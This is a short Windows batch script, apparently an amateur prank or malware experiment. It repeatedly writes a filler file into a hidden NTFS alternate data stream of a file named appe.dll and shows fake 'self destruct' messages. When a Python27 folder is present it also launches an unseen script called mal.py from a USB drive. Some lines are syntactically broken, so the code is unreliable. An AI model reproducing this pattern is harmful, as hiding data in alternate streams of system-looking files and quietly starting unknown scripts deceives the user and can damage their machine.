@echo off
set homefolder=C:\Users\Matthew\Downloads\Nonsense

set location = %~dp0

::start cmd /c "dir & cd /d %homefolder% & if exist hello.txt echo hello > hello.txt & type "%~dp0filler.txt" 1 >> hello.txt:goodbye.txt"
set counter=1
:1
start /wait cmd /c "cd /d %homefolder% & echo Press any key to self destruct. . . & type "%~dp0filler.txt" >> appe.dll:gibb.txt"  
if %counter% equ 3 goto fin
set /A counter+=1
goto 1

:fin
if exist Python27 do(
start cmd /c "python mal.py"  ::to run py script on USB
@echo off

echo Initiating self-destruct. . .
timeout /T 10
)

